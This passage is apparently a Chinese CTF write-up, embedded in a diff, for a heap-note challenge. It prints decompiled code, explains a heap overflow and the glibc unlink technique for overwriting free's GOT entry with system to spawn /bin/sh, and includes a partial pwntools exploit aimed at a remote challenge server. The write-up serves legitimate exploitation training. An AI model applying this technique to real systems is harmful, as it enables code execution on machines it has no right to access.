+    <span class="k">switch</span> <span class="p">(</span> <span class="n">v3</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+        <span class="n">touch</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+        <span class="n">delete</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+        <span class="n">show</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+        <span class="n">take_note</span><span class="p">();</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
+        <span class="n">exit_0</span><span class="p">();</span>
+        <span class="k">return</span><span class="p">;</span>
+      <span class="k">default</span><span class="o">:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"no such option"</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>经典堆漏洞题目的菜单功能</p>
+<p>主要有四个功能</p>
+<p>touch()函数，在现有chunk不满10个前提下，创建一个chunk，大小不限，得到的chunk指针存入bss段中的buf</p>
+<div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">touch</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h]</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
+
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"the node is full"</span><span class="p">);</span>
+      <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"please input the size : "</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">512</span> <span class="p">)</span>
+  <span class="p">{</span><span class="c1">//v1初始为0</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
+    <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"touch successfully"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>take_note()函数，输入chunk的编号，对创建好的chunk 进行内容输入，输入长度为0x100个字节，如果创建的chunk大小只有0x50，这里就会导致堆溢出漏洞</p>
+<div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">take_note</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
+
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"which one do you want modify :"</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0LL</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">9</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"please input the content"</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">v1</span><span class="p">],</span> <span class="mh">0x100uLL</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>delete()函数，free掉chunk后，buf中的指针也被清空了，这样uaf就不能用了</p>
+<div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">delete</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
+
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"which node do you want to delete"</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0LL</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">9</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
+    <span class="n">buf</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>show()函数,如果对应的buf中的指针不为空，则打印出该chunk的内容</p>
+<div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">show</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>
+
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"which node do you want to show"</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0LL</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">9</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"the content is : "</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>通过以上的分析，我们可以发现，uaf不好用，唯一有明显漏洞点的地方在于take_note函数，就是可利用的是堆溢出，而堆溢出有什么用呢，在堆的布局中堆与堆之间都是相邻的，如果存在溢出，则可以修改到下一个chunk的pre_size 和size字段的内容</p>
+<p>这里就可以用到unlink的操作了</p>
+<p>首先需要知道什么是<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink/" target="_blank">unlink</a></p>
+<p>简单来说，unlink是堆管理机制中的一种操作，为了让相邻的空闲chunk合并，避免heap中有太多零零碎碎的内存块，合并之后可以用来应对更大的内存块请求而采取的一种方法，需要注意的是只有不是 fastbin 的情况下才会触发unlink，因为fastbin的size的p位默认为1。</p>
+<p>合并的主要顺序为</p>
+<p>先考虑物理低地址空闲块<br/>
+后考虑物理高地址空闲块<br/>
+合并后的 chunk 指向合并的 chunk 的低地址</p>
+<p>源代码如下</p>
+<div class="highlight"><pre><span></span><span class="cp">#define unlink(AV, P, BK, FD) {                                            </span>
+   <span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>                                                                      
+   <span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>                                                                      
+   <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">P</span> <span class="o">||</span> <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>                      
+     <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="s">"corrupted double-linked list"</span><span class="p">,</span> <span class="n">P</span><span class="p">,</span> <span class="n">AV</span><span class="p">);</span>  
+   <span class="k">else</span> <span class="p">{</span>                                                                      
+       <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>                                                              
+       <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>                                                              
+       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span>                                      
+           <span class="o">&amp;&amp;</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>                      
+           <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>              
+               <span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>    
+             <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span>                                      
+                              <span class="s">"corrupted double-linked list (not small)"</span><span class="p">,</span>    
+                              <span class="n">P</span><span class="p">,</span> <span class="n">AV</span><span class="p">);</span>                                              
+           <span class="k">if</span> <span class="p">(</span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>                                      
+               <span class="k">if</span> <span class="p">(</span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">==</span> <span class="n">P</span><span class="p">)</span>                                      
+                 <span class="n">FD</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>                      
+               <span class="k">else</span> <span class="p">{</span>                                                              
+                   <span class="n">FD</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>                              
+                   <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>                              
+                   <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>                              
+                   <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>                              
+                 <span class="p">}</span>                                                              
+             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>                                                              
+               <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>                      
+               <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>                      
+             <span class="p">}</span>                                                                      
+         <span class="p">}</span>                                                                      
+     <span class="p">}</span>                                                                              
+ <span class="p">}</span>
+</pre></div>
+<p>我们关注的点在于最后造成的结果会是 ：</p>
+<p>FD-&gt;bk = BK;</p>
+<p>BK-&gt;fd = FD;</p>
+<p>如果巧妙的构造fd，bk则会导致一个任意地址写的漏洞</p>
+<p>同时这个unlink有一个检查机制需要绕过：</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">P</span> <span class="o">||</span> <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>                      
+     <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="s">"corrupted double-linked list"</span><span class="p">,</span> <span class="n">P</span><span class="p">,</span> <span class="n">AV</span><span class="p">);</span>
+</pre></div>
+<p>即检查：chunk1前一个chunk的bk是不是chunk1，chunk1后一个chunk的fd是不是chunk1</p>
+<p>如果我们通过touch函数构造chunk0和chunk1，大小都是0x80，接着再通过take_note函数对chunk0进行内容添加，由于输入的字节有0x100那么多，就可以通过溢出，任意修改chunk1的size，使得size字段的p标志位为0，让chunk0被误认为是已经free掉的chunk，这是实现unlink的一个前提条件，即要能修改size字段</p>
+<p>接下来讲讲这题的思路，分为三大步骤：</p>
+<ol>
+<li>泄漏出libc，从而得到system的真正地址</li>
+<li>进行unlink，使得某个chunk的指针指向free函数的got表，并通过修改chunk内容从而修改free的got表为system的真实地址</li>
+<li>free掉一个内容为“/bin/sh\x00”的chunk，也就相对应执行了system(/bin/sh)</li>
+</ol>
+<p>步骤一：</p>
+<p>申请chunk0，chunk1，大小都为0x80</p>
+<p>free chunk0</p>
+<p>再重新申请一个chunk2，此时chunk2得到的地址和chunk0实际上是一样的，那么内容也会是一样的</p>
+<p>由于chunk0被free的时候根据大小被放入了unsorted bins中，这时它的fd和bk都会指向unsorted bins</p>
+<p>如果此时通过show函数打印出chunk2的内容，则实际上会打印出chunk0的fd和bk，也就泄漏出unsorted bins</p>
+<p>当一个small chunk被free的时候，首先是被安排到unsorted bins中，<br/>
+这时它的fd和bk都是指向表头的，因此泄露的地址是&lt;main_arena+88&gt;的地址,<br/>
+而&lt;main_arena&gt;-0x10为&lt;__malloc_hook&gt;函数的真实地址，因此可以用这个函数来泄露libc的基地址&lt;/main_arena&gt;</p>
+<p>步骤二：</p>
+<p>申请chunk0，chunk1，chunk2 ,大小都为0x80,内容均随意填充</p>
+<p>构造 paylode：</p>
+<p>payload = p64(0)+p64(0x81)+p64(fd)+p64(bk)+"a"*0x60<br/>
+payload += p64(0x80)+p64(0x90)</p>
+<p>目的是伪造一个chunk，使得他的大小为0x80，fd为0x6020c0-3*8，bk=fd+8 （0x602c0c是buf的地址）</p>
+<p>通过输入paylode到chunk0中再溢出修改chunk1的pre_size 和size为0x80和0x90，让它误以为chunk1前面就有一个大小为0x80且处于free的状态</p>
+<p>接着free掉chunk1</p>
+<p>此时就进行了unlink的操作</p>
+<p>FD-&gt;bk = BK  ---&gt;  buf = buf -2*8</p>
+<p>BK-&gt;fd = FD  ---&gt;  buf = buf -3*8</p>
+<p>造成的结果是buf[0]的地方存储着【buf-3*8】这个地址</p>
+<p>回顾上面的take_note函数可以发现，是通过buf这个数组来向chunk中写入内容的</p>
+<p>如果此时buf[0]的内容变成了【buf-3*8】而不是chunk0的指针</p>
+<p>那么在向chunk0写入内容的时候就会变成向【buf-3*8】写入内容</p>
+<p>这时就可以改变buf的内容了！将buf[n]的内容都可以被我们改变</p>
+<p>如果将chunk1在buf中的指针改成free的got表，那么就可以改写free的gotb 表了</p>
+<p>步骤三：</p>
+<p>这时再向chunk2中写入“/bin/\sh”</p>
+<p>再将chunk2 free掉</p>
+<p>就相当于执行了：system(/bin/sh)</p>
+<p>exp如下：</p>
+<div class="highlight"><pre><span></span><span class="c1">#encoding:utf-8</span>
+<span class="c1">#!/upr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>
+<span class="n">bin_elf</span> <span class="o">=</span> <span class="s2">"./supwn5"</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span><span class="o">=</span><span class="n">bin_elf</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">bin_elf</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc64.so"</span><span class="p">)</span>
+<span class="c1">#libc = elf.libc</span>
+
+
+<span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"r"</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"43.254.3.203"</span><span class="p">,</span><span class="mi">10005</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"l"</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">bin_elf</span><span class="p">)</span>
+<span class="c1">#-------------------------------------</span>
+<span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">rc</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">timeout</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">ru</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">timeout</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">timeout</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sda</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">s</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="s1">''</span><span class="p">):</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">''</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+<span class="k">def</span> <span class="nf">getshell</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="c1">#-------------------------------------</span>
+
+<span class="k">def</span> <span class="nf">touch</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"please chooice :</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="s2">"1"</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"please input the size : </span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"please chooice :</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="s2">"2"</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"which node do you want to delete</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"please chooice :</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="s2">"3"</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"which node do you want to show</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">take</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"please chooice :</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="s2">"4"</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"which one do you want modify :</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">sda</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">"please input the content</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+
+<span class="n">touch</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="c1">#0</span>
+<span class="n">touch</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="c1">#1，chunk1的作用是防止chunk0在free的时候跟top chunk合并</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">touch</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="c1">#2 = 0</span>
+
+<span class="n">take</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s2">"</span><span class="se">\xff</span><span class="s2">"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">leak</span><span class="o">-</span><span class="mh">0x58</span><span class="o">-</span><span class="mh">0x10</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">malloc_hook</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">"__malloc_hook"</span><span class="p">]</span>
+<span class="n">one</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x4526a</span>
+<span class="n">free</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">"__free_hook"</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">"system"</span><span class="p">]</span>
+<span class="k">print</span> <span class="s2">"malloc_hook---&gt;"</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">)</span>
+<span class="k">print</span> <span class="s2">"libc_base---&gt;"</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">bss</span> <span class="o">=</span> <span class="mh">0x6020c0</span>
+<span class="n">fd</span> <span class="o">=</span> <span class="n">bss</span><span class="o">-</span><span class="mi">3</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">bk</span> <span class="o">=</span> <span class="n">fd</span><span class="o">+</span><span class="mi">8</span>
+<span class="c1">#debug()</span>
+
+<span class="n">touch</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span><span class="c1">#0</span>
